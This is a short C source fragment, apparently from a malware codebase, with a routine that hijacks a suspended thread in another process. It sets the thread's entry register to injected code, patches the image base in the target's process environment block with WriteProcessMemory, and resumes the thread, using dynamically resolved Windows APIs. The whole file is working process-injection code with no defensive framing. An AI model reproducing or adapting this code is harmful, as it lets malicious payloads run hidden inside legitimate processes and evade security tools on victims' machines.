#include "core\injects.h"
#include "core\pe.h"
#include "core\debug.h"

bool RunInjectCode2( HANDLE hprocess, HANDLE hthread, typeFuncThread startFunc, typeInjectCode func )
{
	HMODULE newBaseImage;
	SIZE_T addr = func( hprocess, startFunc, &newBaseImage );

	if( addr != -1 )
	{
		CONTEXT context;
		Mem::Zero(context);

		context.ContextFlags = CONTEXT_INTEGER;
		SIZE_T bytes = 0;

#ifdef WIN64
		context.Rcx = addr;

//		API(KERNEL32, WriteProcessMemory)( hprocess, (void*)( context.Rbx + 8 ), &newBaseImage, 4, &bytes );
#else
		context.Eax	= addr;
		API(KERNEL32, WriteProcessMemory)( hprocess, (void*)( context.Ebx + 8 ), &newBaseImage, 4, &bytes );
#endif

        API(NTDLL, ZwSetContextThread)( hthread, &context );
        API(NTDLL, ZwResumeThread)( (DWORD)hthread, 0 );
		return true;
	}

	return false;
}
